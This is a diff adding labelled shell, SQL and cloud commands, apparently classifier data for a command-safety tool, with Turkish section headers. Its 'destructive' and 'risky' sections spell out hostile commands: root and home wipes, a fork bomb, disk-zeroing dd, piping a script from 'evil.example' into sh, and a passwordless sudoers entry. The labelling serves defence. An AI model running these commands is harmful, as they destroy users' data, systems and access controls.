@@ -33,6 +33,1488 @@
 #
 # -----------------------------------------------------------------------------
 # === SIK SIK YAZDIKLARIM (false positive kontrolü) ===
-# === YANLISLIKLA SİLDİKLERIM ===
+
+ls  |||  safe
+ls -la  |||  safe
+ls -lah  |||  safe
+ls -lt | head  |||  safe
+ls ~/storage/shared  |||  safe
+cd ..  |||  safe
+cd ~  |||  safe
+cd -  |||  safe
+cd ~/projects/drosh  |||  safe
+pwd  |||  safe
+clear  |||  safe
+whoami  |||  safe
+uname -a  |||  safe
+date  |||  safe
+cal  |||  safe
+echo hello  |||  safe
+echo $PATH  |||  safe
+echo $HOME  |||  safe
+env | grep PATH  |||  safe
+printenv  |||  safe
+which python  |||  safe
+which node  |||  safe
+type git  |||  safe
+history | tail -20  |||  safe
+history | grep docker  |||  safe
+alias  |||  safe
+man ls  |||  safe
+tldr tar  |||  safe
+cat README.md  |||  safe
+cat package.json  |||  safe
+cat ~/.bashrc  |||  safe
+cat .env.example  |||  safe
+less log.txt  |||  safe
+head -n 20 data.csv  |||  safe
+tail -n 100 app.log  |||  safe
+tail -f /var/log/syslog  |||  safe
+tail -f logs/dev.log  |||  safe
+wc -l *.py  |||  safe
+sort data.txt | uniq -c | sort -rn  |||  safe
+cut -d, -f1,3 data.csv  |||  safe
+awk '{print $1}' access.log  |||  safe
+grep -rn "TODO" src/  |||  safe
+grep -r "api_key" . --include=*.py  |||  safe
+grep -i error app.log  |||  safe
+rg "fn main"  |||  safe
+rg -n "useState" src  |||  safe
+fd "\.py$"  |||  safe
+find . -name "*.py"  |||  safe
+find . -type f -size +100M  |||  safe
+find . -mtime -1  |||  safe
+find . -name "*.log" -mtime +7  |||  safe
+tree -L 2  |||  safe
+du -sh *  |||  safe
+du -sh node_modules  |||  safe
+du -h --max-depth=1 | sort -h  |||  safe
+df -h  |||  safe
+free -h  |||  safe
+top  |||  safe
+htop  |||  safe
+ps aux  |||  safe
+ps aux | grep node  |||  safe
+lsof -i :3000  |||  safe
+netstat -tulpn  |||  safe
+ss -tulpn  |||  safe
+ip a  |||  safe
+ifconfig  |||  safe
+ping -c 4 google.com  |||  safe
+traceroute example.com  |||  safe
+dig example.com  |||  safe
+nslookup example.com  |||  safe
+curl -I https://example.com  |||  safe
+curl -s https://api.github.com/users/octocat | jq  |||  safe
+curl -s ifconfig.me  |||  safe
+curl -O https://example.com/file.zip  |||  safe
+wget https://example.com/file.tar.gz  |||  safe
+mkdir build  |||  safe
+mkdir -p src/components/ui  |||  safe
+touch main.py  |||  safe
+touch .env  |||  safe
+cp .env.example .env  |||  safe
+cp -r src src_backup  |||  safe
+cp config.json config.json.bak  |||  safe
+mv old_name.py new_name.py  |||  safe
+mv *.png images/  |||  safe
+mv ~/Downloads/report.pdf ~/Documents/  |||  safe
+ln -s /usr/local/bin/python3 /usr/local/bin/python  |||  safe
+tar -czf backup.tar.gz src/  |||  safe
+tar -xzf archive.tar.gz  |||  safe
+tar -tf archive.tar  |||  safe
+zip -r project.zip project/  |||  safe
+unzip archive.zip  |||  safe
+unzip -l archive.zip  |||  safe
+gzip -k big.log  |||  safe
+sha256sum file.iso  |||  safe
+md5sum *.zip  |||  safe
+diff a.txt b.txt  |||  safe
+diff -u old.py new.py  |||  safe
+chmod +x script.sh  |||  safe
+chmod 755 deploy.sh  |||  safe
+chmod 600 ~/.ssh/id_rsa  |||  safe
+chmod 644 index.html  |||  safe
+./script.sh  |||  safe
+bash script.sh  |||  safe
+source ~/.bashrc  |||  safe
+source .venv/bin/activate  |||  safe
+export API_URL=http://localhost:8000  |||  safe
+export PATH="$HOME/.local/bin:$PATH"  |||  safe
+echo 'alias gs="git status"' >> ~/.bashrc  |||  safe
+code .  |||  safe
+vim main.py  |||  safe
+nano ~/.bashrc  |||  safe
+open .  |||  safe
+xdg-open http://localhost:3000  |||  safe
+git status  |||  safe
+git status -sb  |||  safe
+git diff  |||  safe
+git diff --staged  |||  safe
+git diff HEAD~1  |||  safe
+git log  |||  safe
+git log --oneline -20  |||  safe
+git log --graph --oneline --all  |||  safe
+git log -p -- src/app.py  |||  safe
+git show HEAD  |||  safe
+git blame src/main.py  |||  safe
+git add .  |||  safe
+git add -A  |||  safe
+git add -p  |||  safe
+git add src/main.py  |||  safe
+git commit -m "fix: typo"  |||  safe
+git commit -m "feat: add login page"  |||  safe
+git commit -am "wip"  |||  safe
+git commit --amend --no-edit  |||  safe
+git push  |||  safe
+git push origin main  |||  safe
+git push -u origin feature/login  |||  safe
+git pull  |||  safe
+git pull --rebase  |||  safe
+git pull origin main  |||  safe
+git fetch  |||  safe
+git fetch --all --prune  |||  safe
+git checkout main  |||  safe
+git checkout -b feature/new-ui  |||  safe
+git switch main  |||  safe
+git switch -c fix/crash  |||  safe
+git branch  |||  safe
+git branch -a  |||  safe
+git branch -d merged-feature  |||  safe
+git merge main  |||  safe
+git merge --no-ff feature/login  |||  safe
+git rebase main  |||  safe
+git rebase -i HEAD~3  |||  safe
+git stash  |||  safe
+git stash pop  |||  safe
+git stash list  |||  safe
+git stash apply  |||  safe
+git tag v1.2.0  |||  safe
+git tag -a v2.0.0 -m "release"  |||  safe
+git push --tags  |||  safe
+git cherry-pick abc1234  |||  safe
+git remote -v  |||  safe
+git remote add origin git@github.com:muhofy/drosh.git  |||  safe
+git clone https://github.com/user/repo.git  |||  safe
+git clone git@github.com:user/repo.git  |||  safe
+git init  |||  safe
+git config --global user.name "Muhofy"  |||  safe
+git config --global user.email "me@example.com"  |||  safe
+git config --list  |||  safe
+git reset HEAD file.txt  |||  safe
+git reset --soft HEAD~1  |||  safe
+git restore --staged .  |||  safe
+git submodule update --init --recursive  |||  safe
+git bisect start  |||  safe
+git shortlog -sn  |||  safe
+gh pr create --fill  |||  safe
+gh pr list  |||  safe
+gh pr checkout 42  |||  safe
+gh repo clone user/repo  |||  safe
+gh auth status  |||  safe
+npm install  |||  safe
+npm i  |||  safe
+npm install axios  |||  safe
+npm install -D typescript  |||  safe
+npm ci  |||  safe
+npm run dev  |||  safe
+npm run build  |||  safe
+npm run lint  |||  safe
+npm run format  |||  safe
+npm start  |||  safe
+npm test  |||  safe
+npm run test -- --watch  |||  safe
+npm outdated  |||  safe
+npm audit  |||  safe
+npm ls --depth=0  |||  safe
+npm init -y  |||  safe
+npx create-next-app@latest  |||  safe
+npx tsc --noEmit  |||  safe
+npx prettier --write .  |||  safe
+npx eslint . --fix  |||  safe
+pnpm install  |||  safe
+pnpm dev  |||  safe
+pnpm add zod  |||  safe
+yarn  |||  safe
+yarn dev  |||  safe
+yarn add react-query  |||  safe
+bun install  |||  safe
+bun run dev  |||  safe
+node index.js  |||  safe
+node --version  |||  safe
+deno run main.ts  |||  safe
+python main.py  |||  safe
+python3 -V  |||  safe
+python -m venv .venv  |||  safe
+python -m http.server 8000  |||  safe
+python -m pytest tests/  |||  safe
+python -c "print(1+1)"  |||  safe
+pip install -r requirements.txt  |||  safe
+pip install requests  |||  safe
+pip install -e .  |||  safe
+pip list  |||  safe
+pip freeze > requirements.txt  |||  safe
+pip show numpy  |||  safe
+pip install --upgrade pip  |||  safe
+pip uninstall requests  |||  safe
+pytest  |||  safe
+pytest -q  |||  safe
+pytest -x -k test_login  |||  safe
+pytest --cov=src  |||  safe
+black .  |||  safe
+ruff check .  |||  safe
+ruff check . --fix  |||  safe
+mypy src/  |||  safe
+uv sync  |||  safe
+uv pip install httpx  |||  safe
+poetry install  |||  safe
+poetry add fastapi  |||  safe
+uvicorn app.main:app --reload  |||  safe
+flask run  |||  safe
+django-admin startproject mysite  |||  safe
+python manage.py runserver  |||  safe
+python manage.py makemigrations  |||  safe
+python manage.py migrate  |||  safe
+jupyter notebook  |||  safe
+cargo build  |||  safe
+cargo build --release  |||  safe
+cargo run  |||  safe
+cargo test  |||  safe
+cargo check  |||  safe
+cargo fmt  |||  safe
+cargo clippy  |||  safe
+cargo add serde  |||  safe
+rustc --version  |||  safe
+go build  |||  safe
+go run .  |||  safe
+go test ./...  |||  safe
+go mod tidy  |||  safe
+go fmt ./...  |||  safe
+go vet ./...  |||  safe
+make  |||  safe
+make build  |||  safe
+make test  |||  safe
+cmake -B build  |||  safe
+gcc main.c -o main  |||  safe
+g++ -O2 main.cpp -o main  |||  safe
+javac Main.java  |||  safe
+java -jar app.jar  |||  safe
+mvn clean install  |||  safe
+mvn test  |||  safe
+gradle build  |||  safe
+./gradlew assembleDebug  |||  safe
+docker ps  |||  safe
+docker ps -a  |||  safe
+docker images  |||  safe
+docker build -t myapp .  |||  safe
+docker run -it --rm ubuntu bash  |||  safe
+docker run -p 8080:80 nginx  |||  safe
+docker run -d --name db -e POSTGRES_PASSWORD=pw postgres:16  |||  safe
+docker exec -it web sh  |||  safe
+docker exec -it db psql -U postgres  |||  safe
+docker logs -f web  |||  safe
+docker logs --tail 100 web  |||  safe
+docker stop web  |||  safe
+docker start web  |||  safe
+docker restart web  |||  safe
+docker pull node:20-alpine  |||  safe
+docker inspect web  |||  safe
+docker stats  |||  safe
+docker compose up  |||  safe
+docker compose up -d  |||  safe
+docker compose up -d --build  |||  safe
+docker compose down  |||  safe
+docker compose logs -f  |||  safe
+docker compose ps  |||  safe
+docker compose restart api  |||  safe
+docker compose exec api bash  |||  safe
+docker-compose up -d  |||  safe
+docker network ls  |||  safe
+docker volume ls  |||  safe
+kubectl get pods  |||  safe
+kubectl get pods -A  |||  safe
+kubectl get svc  |||  safe
+kubectl get nodes  |||  safe
+kubectl get deployments -n staging  |||  safe
+kubectl describe pod my-pod  |||  safe
+kubectl logs -f my-pod  |||  safe
+kubectl logs my-pod --previous  |||  safe
+kubectl config current-context  |||  safe
+kubectl config get-contexts  |||  safe
+kubectl port-forward svc/api 8080:80  |||  safe
+kubectl apply -f deployment.yaml --dry-run=client  |||  safe
+kubectl diff -f k8s/  |||  safe
+kubectl top pods  |||  safe
+helm list  |||  safe
+helm repo update  |||  safe
+helm template my-chart .  |||  safe
+terraform init  |||  safe
+terraform fmt  |||  safe
+terraform validate  |||  safe
+terraform plan  |||  safe
+terraform output  |||  safe
+terraform state list  |||  safe
+aws s3 ls  |||  safe
+aws s3 ls s3://my-bucket  |||  safe
+aws sts get-caller-identity  |||  safe
+aws ec2 describe-instances  |||  safe
+aws configure list  |||  safe
+gcloud config list  |||  safe
+gcloud compute instances list  |||  safe
+az account show  |||  safe
+ssh user@192.168.1.10  |||  safe
+ssh -i ~/.ssh/key.pem ubuntu@host  |||  safe
+ssh-keygen -t ed25519 -C "me@example.com"  |||  safe
+ssh-add ~/.ssh/id_ed25519  |||  safe
+scp file.txt user@host:/tmp/  |||  safe
+scp -r user@host:/var/log/app ./logs  |||  safe
+rsync -avz src/ user@host:/srv/app/ --dry-run  |||  safe
+rsync -avz ./dist/ user@host:/var/www/html/  |||  safe
+rsync -av --progress src/ backup/  |||  safe
+psql -U postgres -d mydb  |||  safe
+psql -c "SELECT count(*) FROM users;"  |||  safe
+mysql -u root -p  |||  safe
+sqlite3 app.db ".tables"  |||  safe
+sqlite3 app.db "SELECT * FROM users LIMIT 5;"  |||  safe
+redis-cli ping  |||  safe
+redis-cli keys "session:*"  |||  safe
+redis-cli get mykey  |||  safe
+mongosh  |||  safe
+pg_dump mydb > backup.sql  |||  safe
+mysqldump -u root -p mydb > dump.sql  |||  safe
+systemctl status nginx  |||  safe
+systemctl list-units --type=service  |||  safe
+journalctl -u nginx -f  |||  safe
+journalctl -xe  |||  safe
+dmesg | tail  |||  safe
+crontab -l  |||  safe
+sudo apt update  |||  safe
+sudo apt install htop  |||  safe
+sudo apt upgrade -y  |||  safe
+apt list --installed  |||  safe
+apt search ripgrep  |||  safe
+brew update  |||  safe
+brew install wget  |||  safe
+brew upgrade  |||  safe
+brew list  |||  safe
+brew doctor  |||  safe
+pkg update  |||  safe
+pkg install python  |||  safe
+pkg install git openssh  |||  safe
+pkg upgrade  |||  safe
+pkg list-installed  |||  safe
+termux-setup-storage  |||  safe
+termux-wake-lock  |||  safe
+termux-battery-status  |||  safe
+termux-clipboard-get  |||  safe
+termux-open-url https://example.com  |||  safe
+adb devices  |||  safe
+adb logcat  |||  safe
+adb shell getprop ro.build.version.release  |||  safe
+adb install app-debug.apk  |||  safe
+adb push file.txt /sdcard/Download/  |||  safe
+adb pull /sdcard/Download/file.txt .  |||  safe
+adb shell pm list packages  |||  safe
+adb reboot  |||  risky
+tmux  |||  safe
+tmux new -s dev  |||  safe
+tmux attach -t dev  |||  safe
+tmux ls  |||  safe
+screen -S build  |||  safe
+nohup python bot.py &  |||  safe
+python bot.py &  |||  safe
+jobs  |||  safe
+fg  |||  safe
+bg  |||  safe
+sleep 5  |||  safe
+watch -n 2 df -h  |||  safe
+time make build  |||  safe
+exit  |||  safe
+logout  |||  safe
+
+# === YANLISLIKLA SİLDİKLERİM ===
+
+rm -rf src  |||  destructive
+rm -rf ./src  |||  destructive
+rm -rf *  |||  destructive
+rm -rf .git  |||  destructive
+rm -rf .env  |||  destructive
+rm -rf ~/projects/old-client-work  |||  destructive
+rm -rf ~/Documents/thesis  |||  destructive
+rm -rf ~/storage/shared/DCIM  |||  destructive
+rm -rf ~/storage/shared/Download/*  |||  destructive
+rm -rf /sdcard/DCIM/Camera  |||  destructive
+rm -r tests  |||  destructive
+rm *.py  |||  destructive
+rm -f *.md  |||  destructive
+rm report_final.docx  |||  risky
+rm notes.txt  |||  risky
+rm -i old.txt  |||  safe
+rm -rf backup  |||  destructive
+rm -rf ../  |||  destructive
+rm -rf ./*  |||  destructive
+rm -rf .*  |||  destructive
+rm -rf /home/user/data  |||  destructive
+rm -rf "$DIR"/*  |||  risky
+rm -rf $DIR/  |||  risky
+rm -rf ${BUILD_DIR}/*  |||  risky
+cd build && rm -rf *  |||  risky
+cd /tmp && rm -rf *  |||  risky
+ls | xargs rm -rf  |||  destructive
+find . -type f -delete  |||  destructive
+find . -name "*.py" -delete  |||  destructive
+find . -name "*.bak" -delete  |||  risky
+find ~ -type f -delete  |||  destructive
+find . -mtime +30 -exec rm -rf {} \;  |||  risky
+mv * ../  |||  risky
+mv src /dev/null  |||  destructive
+mv ~/projects /tmp/projects  |||  risky
+mv important.db /tmp/  |||  risky
+cp new.conf /etc/nginx/nginx.conf  |||  risky
+cp /dev/null ~/.bash_history  |||  safe
+> config.json  |||  destructive
+> main.py  |||  destructive
+> database.sqlite  |||  destructive
+cat /dev/null > data.db  |||  destructive
+echo "" > .env  |||  destructive
+echo "" > ~/.ssh/authorized_keys  |||  destructive
+truncate -s 0 data.db  |||  destructive
+truncate -s 0 production.sqlite3  |||  destructive
+sed -i 's/foo/bar/g' *.py  |||  risky
+sed -i '' 's/foo/bar/g' src/*.js  |||  risky
+sed -i 'd' data.csv  |||  destructive
+git reset --hard HEAD~3  |||  destructive
+git reset --hard origin/main  |||  destructive
+git reset --hard HEAD  |||  risky
+git checkout -- .  |||  destructive
+git checkout .  |||  destructive
+git restore .  |||  destructive
+git restore src/main.py  |||  risky
+git clean -fd  |||  risky
+git clean -fdx  |||  risky
+git clean -fdx /  |||  destructive
+git stash drop  |||  risky
+git stash clear  |||  destructive
+git branch -D feature/auth  |||  risky
+git branch -D main  |||  destructive
+git push --force origin main  |||  destructive
+git push -f  |||  destructive
+git push --force --all  |||  destructive
+git push --force-with-lease origin feature/x  |||  risky
+git push origin --delete main  |||  destructive
+git push origin --delete old-branch  |||  risky
+git push origin :feature/old  |||  risky
+git tag -d v1.0.0  |||  risky
+git push origin --delete v1.0.0  |||  risky
+git filter-branch --force --index-filter 'git rm --cached -r secrets' HEAD  |||  destructive
+git reflog expire --expire=now --all  |||  destructive
+git reflog expire --expire=now --all && git gc --prune=now  |||  destructive
+git gc --prune=now --aggressive  |||  risky
+git rebase --abort  |||  safe
+git commit --amend -m "new message"  |||  risky
+git revert HEAD  |||  safe
+git update-ref -d HEAD  |||  destructive
+DROP TABLE users;  |||  destructive
+DROP TABLE orders CASCADE;  |||  destructive
+DROP DATABASE production;  |||  destructive
+DELETE FROM orders;  |||  destructive
+DELETE FROM users WHERE 1=1;  |||  destructive
+DELETE FROM orders WHERE id = 5;  |||  risky
+UPDATE users SET role = 'admin';  |||  destructive
+UPDATE users SET password = 'x';  |||  destructive
+UPDATE orders SET status = 'cancelled' WHERE id = 42;  |||  risky
+TRUNCATE TABLE logs;  |||  destructive
+TRUNCATE users, orders CASCADE;  |||  destructive
+ALTER TABLE users DROP COLUMN email;  |||  destructive
+psql -c "DROP TABLE users;"  |||  destructive
+psql -c "DELETE FROM sessions;"  |||  destructive
+sqlite3 app.db "DROP TABLE users;"  |||  destructive
+sqlite3 app.db "DELETE FROM users;"  |||  destructive
+mysql -e "DROP DATABASE shop;"  |||  destructive
+dropdb production  |||  destructive
+dropdb mydb  |||  destructive
+redis-cli FLUSHALL  |||  destructive
+redis-cli DEL session:abc  |||  risky
+mongosh --eval "db.dropDatabase()"  |||  destructive
+mongosh --eval "db.users.deleteMany({})"  |||  destructive
+pg_restore --clean -d mydb backup.dump  |||  risky
+docker volume rm pgdata  |||  destructive
+docker volume prune -f  |||  destructive
+docker compose down -v  |||  destructive
+docker compose down --volumes --rmi all  |||  destructive
+docker rm -f db  |||  risky
+docker rm -f $(docker ps -aq)  |||  risky
+docker rmi -f $(docker images -q)  |||  risky
+docker system prune -a --volumes -f  |||  destructive
+kubectl delete pod my-pod  |||  risky
+kubectl delete deployment api  |||  risky
+kubectl delete namespace staging  |||  destructive
+kubectl delete namespace prod  |||  destructive
+kubectl delete pvc data-claim  |||  destructive
+kubectl delete -f k8s/ --all  |||  destructive
+kubectl delete all --all -A  |||  destructive
+kubectl apply -f deployment.yaml  |||  risky
+kubectl rollout restart deployment/api  |||  risky
+kubectl scale deployment api --replicas=0  |||  risky
+kubectl drain node-1 --ignore-daemonsets  |||  risky
+terraform apply  |||  risky
+terraform apply -auto-approve  |||  risky
+terraform destroy  |||  destructive
+terraform destroy -auto-approve  |||  destructive
+terraform state rm aws_db_instance.main  |||  risky
+aws s3 rm s3://my-bucket --recursive  |||  destructive
+aws s3 rm s3://my-bucket/file.txt  |||  risky
+aws s3 rb s3://my-bucket --force  |||  destructive
+aws s3 sync . s3://my-bucket --delete  |||  risky
+aws ec2 terminate-instances --instance-ids i-0abc123  |||  destructive
+aws rds delete-db-instance --db-instance-identifier prod --skip-final-snapshot  |||  destructive
+aws iam delete-user --user-name bob  |||  risky
+aws dynamodb delete-table --table-name users  |||  destructive
+gcloud compute instances delete vm-1  |||  destructive
+gcloud projects delete my-project  |||  destructive
+gcloud sql instances delete prod-db  |||  destructive
+az group delete --name prod-rg --yes  |||  destructive
+gh repo delete user/repo --yes  |||  destructive
+heroku apps:destroy myapp --confirm myapp  |||  destructive
+heroku pg:reset DATABASE  |||  destructive
+vercel remove my-project --yes  |||  destructive
+rsync -a --delete src/ dst/  |||  risky
+rsync -av --delete ./ user@host:/var/www/  |||  risky
+rsync -av --delete /empty/ /data/  |||  destructive
+crontab -r  |||  destructive
+userdel -r bob  |||  destructive
+sudo apt remove python3  |||  risky
+sudo apt purge nginx  |||  risky
+sudo apt autoremove  |||  risky
+sudo apt remove --purge python3  |||  destructive
+brew uninstall node  |||  risky
+npm uninstall -g npm  |||  risky
+pip uninstall -y -r requirements.txt  |||  risky
+killall node  |||  risky
+killall -9 python  |||  risky
+pkill -9 -f python  |||  risky
+kill -9 1  |||  destructive
+kill -9 -1  |||  destructive
+reboot  |||  risky
+shutdown -h now  |||  risky
+sudo shutdown -r now  |||  risky
+chmod -R 777 .  |||  risky
+chmod -R 777 /var/www  |||  risky
+chmod -R 000 ~/projects  |||  risky
+chown -R root:root ~  |||  risky
+adb shell pm clear com.example.app  |||  risky
+adb uninstall com.whatsapp  |||  risky
+adb shell rm -rf /sdcard/Android/data/com.example  |||  destructive
+adb shell rm -rf /sdcard/*  |||  destructive
+adb shell wipe data  |||  destructive
+adb reboot bootloader  |||  risky
+fastboot erase userdata  |||  destructive
+fastboot flashing unlock  |||  destructive
+fastboot flash boot boot.img  |||  risky
+su -c "rm -rf /data/data/com.example"  |||  destructive
+su -c "pm uninstall --user 0 com.android.chrome"  |||  risky
+pm uninstall com.example.app  |||  risky
+pm clear com.example.app  |||  risky
+termux-reset  |||  destructive
+rm -rf $PREFIX  |||  destructive
+rm -rf /data/data/com.termux/files/usr  |||  destructive
+rm -rf ~/.termux  |||  risky
+rm -rf ~/.ssh  |||  destructive
+rm ~/.ssh/id_rsa  |||  destructive
+rm ~/.ssh/id_ed25519  |||  destructive
+rm -rf ~/.gnupg  |||  destructive
+rm -rf ~/.config  |||  destructive
+rm ~/.bashrc  |||  risky
+rm -rf ~/.git  |||  destructive
+ssh-keygen -f ~/.ssh/id_rsa  |||  risky
+mkfs.ext4 /dev/sdb1  |||  destructive
+mkfs.vfat /dev/sdc  |||  destructive
+fdisk /dev/sda  |||  risky
+parted /dev/sda rm 1  |||  destructive
+wipefs -a /dev/sdb  |||  destructive
+dd if=/dev/zero of=/dev/sda  |||  destructive
+dd if=/dev/zero of=/dev/sdb bs=1M  |||  destructive
+dd if=ubuntu.iso of=/dev/sdb bs=4M  |||  destructive
+dd if=/dev/urandom of=/dev/sda  |||  destructive
+shred -u secrets.txt  |||  destructive
+shred -vfz -n 5 /dev/sda  |||  destructive
+diskutil eraseDisk JHFS+ Untitled /dev/disk2  |||  destructive
+diskutil eraseVolume HFS+ Blank /Volumes/Backup  |||  destructive
+
 # === KORKTUĞUM KOMUTLAR ===
+
+sudo rm -rf /  |||  destructive
+rm -rf /  |||  destructive
+rm -rf /*  |||  destructive
+rm -rf --no-preserve-root /  |||  destructive
+sudo rm -rf --no-preserve-root /  |||  destructive
+rm -rf ~  |||  destructive
+rm -rf ~/  |||  destructive
+rm -rf ~/*  |||  destructive
+rm -rf $HOME  |||  destructive
+rm -rf "$HOME"/*  |||  destructive
+rm -rf /home  |||  destructive
+rm -rf /home/*  |||  destructive
+sudo rm -rf /etc  |||  destructive
+sudo rm -rf /usr  |||  destructive
+sudo rm -rf /var/lib  |||  destructive
+sudo rm -rf /boot  |||  destructive
+sudo rm -rf /bin  |||  destructive
+sudo rm -rf /lib  |||  destructive
+sudo rm -rf /opt  |||  destructive
+sudo rm -rf /var/lib/postgresql  |||  destructive
+sudo rm -rf /var/lib/docker  |||  destructive
+sudo rm -rf /var/www  |||  destructive
+sudo rm -rf /data  |||  destructive
+rm -rf /sdcard/*  |||  destructive
+rm -rf /storage/emulated/0  |||  destructive
+rm -rf /storage/emulated/0/*  |||  destructive
+rm -rf ~/storage/shared/*  |||  destructive
+rm -rf /system  |||  destructive
+bash -c "rm -rf /"  |||  destructive
+sh -c 'rm -rf ~'  |||  destructive
+eval "rm -rf /"  |||  destructive
+/bin/rm -rf /  |||  destructive
+command rm -rf ~  |||  destructive
+\rm -rf /  |||  destructive
+r\m -rf /  |||  destructive
+sudo -s rm -rf /  |||  destructive
+sudo su -c "rm -rf /"  |||  destructive
+find / -delete  |||  destructive
+find / -name "*.log" -exec rm -rf {} \;  |||  risky
+find / -type f -exec rm -f {} +  |||  destructive
+find ~ -exec rm -rf {} +  |||  destructive
+find / -name "*" -delete  |||  destructive
+:(){ :|:& };:  |||  destructive
+dd if=/dev/zero of=/dev/sda bs=1M count=1000  |||  destructive
+dd if=/dev/random of=/dev/nvme0n1  |||  destructive
+dd if=/dev/zero of=/dev/mmcblk0  |||  destructive
+dd if=/dev/zero of=/dev/block/mmcblk0  |||  destructive
+mkfs.ext4 /dev/sda  |||  destructive
+mkfs.ext4 /dev/nvme0n1p1  |||  destructive
+mkfs -t ext4 /dev/sda1  |||  destructive
+mkswap /dev/sda1  |||  destructive
+> /dev/sda  |||  destructive
+cat /dev/zero > /dev/sda  |||  destructive
+echo "" > /etc/passwd  |||  destructive
+> /etc/shadow  |||  destructive
+> /etc/fstab  |||  destructive
+mv /etc /etc.bak  |||  destructive
+mv /usr/bin /tmp  |||  destructive
+mv ~ /tmp  |||  destructive
+mv / /tmp  |||  destructive
+chmod -R 777 /  |||  destructive
+chmod -R 000 /  |||  destructive
+chmod 000 /etc  |||  destructive
+chmod -R 777 /etc  |||  destructive
+chmod -R 777 ~  |||  risky
+chown -R user:user /  |||  destructive
+chown -R nobody /  |||  destructive
+sudo chmod -R 777 /var  |||  risky
+sudo chmod -R 755 /etc  |||  risky
+sudo chmod 777 /etc/sudoers  |||  destructive
+curl http://example.com/install.sh | sh  |||  risky
+curl http://example.com/install.sh | sudo bash  |||  risky
+curl -fsSL https://get.docker.com | sh  |||  risky
+wget -O- http://evil.example/x.sh | sh  |||  risky
+wget -qO- https://example.com/setup | sudo sh  |||  risky
+eval $(curl -s http://example.com/cmd)  |||  risky
+bash <(curl -s https://example.com/install.sh)  |||  risky
+python -c "$(curl -s https://example.com/x.py)"  |||  risky
+curl -X DELETE https://api.example.com/users/1  |||  risky
+curl -X DELETE https://api.example.com/v1/projects  |||  risky
+curl -X POST https://api.example.com/reset  |||  risky
+curl -X POST -d @data.json https://api.example.com/import  |||  risky
+curl -u admin:pw -X DELETE https://es.example.com/_all  |||  destructive
+git push --force  |||  destructive
+git push origin main --force  |||  destructive
+git push --mirror  |||  destructive
+git push origin --delete master  |||  destructive
+git reset --hard HEAD~100  |||  destructive
+git reset --hard && git clean -fdx  |||  destructive
+git checkout -f  |||  destructive
+git clean -ffdx  |||  destructive
+git stash clear && git gc --prune=now  |||  destructive
+git rm -rf .  |||  destructive
+git rm -rf --cached .  |||  risky
+git branch -D $(git branch | grep -v main)  |||  destructive
+git remote remove origin  |||  risky
+DROP SCHEMA public CASCADE;  |||  destructive
+DROP DATABASE prod;  |||  destructive
+DROP DATABASE IF EXISTS app_production;  |||  destructive
+DROP USER admin;  |||  risky
+DELETE FROM customers;  |||  destructive
+DELETE FROM payments WHERE 1;  |||  destructive
+TRUNCATE TABLE payments;  |||  destructive
+UPDATE accounts SET balance = 0;  |||  destructive
+GRANT ALL PRIVILEGES ON *.* TO 'x'@'%';  |||  risky
+psql -c "DROP DATABASE production;"  |||  destructive
+psql -h prod-db.internal -c "DELETE FROM users;"  |||  destructive
+mysql -h prod -e "TRUNCATE orders;"  |||  destructive
+sqlite3 ~/.local/share/app/data.db "DELETE FROM notes;"  |||  destructive
+redis-cli -h prod FLUSHALL  |||  destructive
+redis-cli FLUSHALL ASYNC  |||  destructive
+mongosh prod --eval "db.dropDatabase()"  |||  destructive
+kubectl delete ns production  |||  destructive
+kubectl delete nodes --all  |||  destructive
+kubectl delete pvc --all -A  |||  destructive
+kubectl delete pods --all -A  |||  risky
+kubectl delete crd --all  |||  destructive
+kubectl delete secret --all -n prod  |||  destructive
+kubectl replace --force -f deploy.yaml  |||  risky
+helm uninstall prod-release  |||  destructive
+helm delete --purge api  |||  destructive
+docker rm -f $(docker ps -aq) && docker volume prune -f  |||  destructive
+docker rm -fv $(docker ps -aq)  |||  destructive
+docker volume rm $(docker volume ls -q)  |||  destructive
+docker system prune -a --volumes  |||  destructive
+terraform destroy -auto-approve -target=aws_db_instance.prod  |||  destructive
+terraform apply -auto-approve -replace=aws_instance.prod  |||  destructive
+terraform force-unlock -force abc123  |||  risky
+aws s3 rm s3://prod-backups --recursive  |||  destructive
+aws s3 rb s3://prod-assets --force  |||  destructive
+aws s3 sync empty/ s3://prod-bucket --delete  |||  destructive
+aws ec2 terminate-instances --instance-ids $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text)  |||  destructive
+aws rds delete-db-cluster --db-cluster-identifier prod --skip-final-snapshot  |||  destructive
+aws cloudformation delete-stack --stack-name prod  |||  destructive
+aws iam delete-access-key --access-key-id AKIAXXXX  |||  risky
+aws lambda delete-function --function-name api  |||  destructive
+aws route53 delete-hosted-zone --id Z123  |||  destructive
+gcloud projects delete prod-project --quiet  |||  destructive
+gcloud container clusters delete prod --quiet  |||  destructive
+gcloud storage rm -r gs://prod-bucket  |||  destructive
+gsutil -m rm -r gs://prod-bucket  |||  destructive
+az vm delete --ids $(az vm list --query "[].id" -o tsv) --yes  |||  destructive
+az storage account delete --name prodstore --yes  |||  destructive
+gh repo delete muhofy/drosh --yes  |||  destructive
+gh release delete v1.0.0 --yes  |||  risky
+gh secret delete API_KEY  |||  risky
+heroku apps:destroy --app prod --confirm prod  |||  destructive
+heroku pg:reset DATABASE_URL --confirm prod  |||  destructive
+fly apps destroy myapp --yes  |||  destructive
+vercel rm --safe --yes  |||  risky
+npm publish  |||  risky
+npm unpublish my-package --force  |||  destructive
+npm deprecate my-package "do not use"  |||  risky
+pip install --break-system-packages requests  |||  risky
+sudo pip install requests  |||  risky
+sudo pip uninstall -y setuptools pip  |||  risky
+sudo npm install -g  |||  risky
+sudo apt remove --purge -y python3 libc6  |||  destructive
+sudo apt autoremove --purge -y  |||  risky
+sudo dpkg --force-all -r libc6  |||  destructive
+sudo yum remove glibc  |||  destructive
+sudo pacman -Rdd glibc  |||  destructive
+sudo systemctl stop sshd  |||  risky
+sudo systemctl disable sshd  |||  risky
+sudo systemctl stop docker  |||  risky
+sudo systemctl disable --now firewalld  |||  risky
+sudo systemctl restart nginx  |||  risky
+sudo systemctl restart networking  |||  risky
+sudo service ssh stop  |||  risky
+sudo reboot  |||  risky
+sudo shutdown -h now  |||  risky
+sudo halt  |||  risky
+sudo poweroff  |||  risky
+init 0  |||  risky
+iptables -F  |||  risky
+iptables -P INPUT DROP  |||  risky
+sudo ufw disable  |||  risky
+sudo ufw reset  |||  risky
+ifconfig eth0 down  |||  risky
+sudo ip link set eth0 down  |||  risky
+passwd root  |||  risky
+passwd  |||  risky
+sudo passwd -l root  |||  risky
+sudo usermod -aG sudo bob  |||  risky
+sudo visudo  |||  risky
+echo "bob ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers  |||  risky
